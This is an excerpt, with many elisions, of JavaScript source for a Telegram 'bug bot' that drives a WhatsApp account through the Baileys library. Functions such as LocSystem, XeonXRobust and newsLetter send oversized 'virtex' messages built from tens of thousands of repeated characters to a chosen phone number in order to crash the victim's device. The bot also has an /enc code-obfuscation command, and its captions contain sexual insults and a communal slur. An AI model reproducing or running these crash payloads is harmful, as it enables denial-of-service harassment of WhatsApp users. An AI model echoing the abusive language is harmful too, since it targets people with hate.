...
const startSesi = async () => {
    ...
    Jojoo = makeWASocket(connectionOptions);

    // Pairing code jika diaktifkan
    if (usePairingCode && !Jojoo.authState.creds.registered) {
        let phoneNumber = await question(chalk.black(chalk.bgCyan(`\ncht me loda lega 91:\n`)));
        phoneNumber = phoneNumber.replace(/[^0-9]/g, '');
        const code = await Jojoo.requestPairingCode(phoneNumber.trim());
        const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;
        console.log(chalk.black(chalk.bgCyan(`Pairing Code: `)), chalk.black(chalk.bgWhite(formattedCode)));
    }

    Jojoo.ev.on('creds.update', saveCreds);
    store.bind(Jojoo.ev);

    Jojoo.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;

        if (connection === 'open') {
            isWhatsAppConnected = true;
            console.log(chalk.green('WhatsApp motu PATLU conncet!'));
        }

        if (connection === 'close') {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            console.log(
                chalk.red('Koneksi WhatsApp chut.'),
...
bot.command('addprem', (ctx) => {
    ...
    if (ownerId !== OWNER_ID) {
        return ctx.reply('❌ LODU TU OWNER NHI HAI 🤣.');
    }
...
bot.command('premiumfeature', (ctx) => {
    ...
    ctx.reply('🎉 Welcome to the motu PATLU hindu hai.');
});
// Fungsi untuk mengirim pesan saat proses
const prosesrespone = (target, ctx) => {
    const photoUrl = 'https://files.catbox.moe/asx3vo.jpg'; // Ganti dengan URL gambar atau gunakan buffer gambar
    const caption = `╭⫘⫘⫘⫘⫘⫘· · ─ ·𖥸· ─ · ·「 ⚡️PROCCES 」── .✦
│ TERI MAA KI CHUT AFZAL MULLA
│ © 𝙈𝙊𝙏𝙐 𝙋𝘼𝙏𝙇𝙐🕉️ 2.7 𝘽𝙐𝙂 𝘽𝙊𝙏
╰⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘♡`;
...
const kirimpesan = async (number, message) => {
  try {
    ...
    await Jojoo.sendMessage(target, {
      text: message
    });
...
bot.command("enc", async (ctx) => {
    ...
    const obfuscatedCode = await JsConfuser.obfuscate(codeBuffer.toString(), {
        ...
        identifierGenerator: function () {
            ...
            "素晴座素晴難𝙈𝙊𝙏𝙐 𝙋𝘼𝙏𝙇𝙐🕉️ 2.7 𝘽𝙐𝙂 𝘽𝙊𝙏素晴座素晴難" + 
            "素晴座素晴難𝙈𝙊𝙏𝙐 𝙋𝘼𝙏𝙇𝙐🕉️ 2.7 𝘽𝙐𝙂 𝘽𝙊𝙏素晴座素晴";
...
bot.command("xcbeta", checkWhatsAppConnection, async ctx => {
  ...
  return ctx.reply('🦠bug sudah terkirim silahkan di cek kak.🦠');
});
...
bot.start(ctx => {
  const menuMessage = `
👋hello, welcome to Jojork, press the button below to bring up the menu       
...
`;
  ...
  const photoUrl = "https://files.catbox.moe/asx3vo.jpg"; 


const keyboard = [
    [
        { text: "🌱Bug menu", callback_data: "bugmenu" },
        { text: "🌾 Owner", url: "https://t.me/MOTU_PATALU_HINDU_HAI" }
    ],
    [
        { text: "🌱Tanks to", callback_data: "thanksto" },
        { text: "🌱Hiburan", callback_data: "menu" },
...
> © 𝙈𝙊𝙏𝙐 𝙋𝘼𝙏𝙇𝙐🕉️ 2.7 𝘽𝙐𝙂 𝘽𝙊𝙏
  ...
  ctx.replyWithPhoto("https://files.catbox.moe/5sshpo.mp4", {
    caption: menu,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: keyboard
    ...
    ctx.replyWithAudio({
      url: "https://files.catbox.moe/5sshpo.mp4" 
    });
  });
});
bot.action("thaksto", (ctx) => {
  ...
  const greeting = new Date().getHours() < 12 ? "Pagi" : new Date().getHours() < 18 ? "Sore" : "Malam";
  const menu = `
   👋 Hello Unknown, this is a creadit from our sc 𝙅𝙤𝙟𝙤𝙍𝙆 1.1 thanks to I'm here to assist you with anything you might need, making your interaction smoother and more efficient.       .       

Selamat ${greeting} !
ᝄ ⌜ C R E A D I T ⌟
䒘 > Dev @MOTU_PATALU_HINDU_HAI
䒘 > support @MOTU_PATALU_HINDU_HAI
⟣──────────
  `;
  ...
  ctx.replyWithPhoto("https://files.catbox.moe/asx3vo.jpg", {
    caption: menu,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: keyboard
...
│ 
│ 
│ JAI श्री राम 𝙈𝘼𝘿𝙀 𝘽𝙔 𝙈𝙊𝙏𝙐 𝙋𝘼𝙏𝙇𝙐🕉️
│
│⫘⫘⫘⫘「 🐉ALL FITUR 」── .✦
│愛  /brat
│愛  /enc 
...
> © 𝙈𝙊𝙏𝙐 𝙋𝘼𝙏𝙇𝙐🕉️ 2.7 𝘽𝙐𝙂 𝘽𝙊𝙏
  ...
  ctx.replyWithPhoto("https://files.catbox.moe/asx3vo.jpg", {
    ...
    ctx.replyWithAudio({
      url: "hhttps://files.catbox.moe/5sshpo.mp4" 
    });
  });
});
bot.action("bugmenu", (ctx) => {
  ...
  const greeting = new Date().getHours() < 12 ? "Pagi" : new Date().getHours() < 18 ? "Sore" : "Malam";
  const menu = `
👋 Hello Unknown, I am the 𝙏𝙚𝙡𝙚𝙜𝙧𝙖𝙢 𝘽𝙤𝙩 created ฿Ɏ 𝙈𝙊𝙏𝙐 𝙋𝘼𝙏𝙇𝙐🕉️. I'm here to assist you with anything you might need, making your interaction smoother and more efficient.
Selamat ${greeting}!
╭-ˋˏ ༻❁「  𝗪 𝗘 𝗟 𝗖 𝗢 𝗠 𝗘  」── .✦
│ 
│  
...
bot.command("bugmenu", ctx => {
  const menu = `
   👋 Hello Unknown, I am the 𝙏𝙚𝙡𝙚𝙜𝙧𝙖𝙢 𝘽𝙤𝙩  created by Jojoo. I'm here to assist you with anything you might need, making your interaction smoother and more efficient.       
Selamat ${greeting} !
╭-ˋˏ ༻❁✿「 𝗪 𝗘 𝗟 𝗖 𝗢 𝗠 𝗘 」── .✦
│ 
│  
...
//function bug
    async function LocSystem(target) {
            ...
            await Jojoo.relayMessage(target, {
...
console.log(chalk.red.bold('Crash System Device By ☆ JojooCrash'))
};
async function XeonXRobust(target, Ptcp = true) {
  ...
  await Jojoo.relayMessage(target, {
        ...
        interactiveMessage: {
          header: {
            documentMessage: {
              ...
              contactVcard: true,
              jpegThumbnail: "https://files.catbox.moe/asx3vo.jpg"
            },
            hasMediaAttachment: true
          },
          body: {
    ...
    Jojoo.relayMessage(target, messagePayload, { participant: { jid: target } }, { messageId: null });
}
...
let virtex = "Wanna With Yours :D " + "ྫྷ".repeat(77777) + "@0".repeat(50000);
            ...
            console.log(chalk.red.bold('Jojoork'))
   	};
...
async function newsLetter(target) {
            try {
                    ...
                    botInvokeMessage: {
                        message: {
                            newsletterAdminInviteMessage: {
                                ...
                                newsletterName: "𝙅𝙤𝙟𝙤𝙍𝙆" + "ી".repeat(120000),
                                jpegThumbnail: "",
                ...
                await Jojoo.relayMessage(target, messsage, {
                    userJid: target,
                });
            }
            catch (err) {
          ...
          extendedTextMessage: {
            ...
            contextInfo: {
              ...
              externalAdReply: {
                ...
                sourceType: " x ",
                sourceId: " x ",
                sourceUrl: "https://t.me/@Userjojoox",
                mediaUrl: "https://t.me/Userjojoox",
                containsAutoReply: true,
                renderLargerThumbnail: true,
                showAdAttribution: true,
                ctwaClid: "ctwa_clid_example",
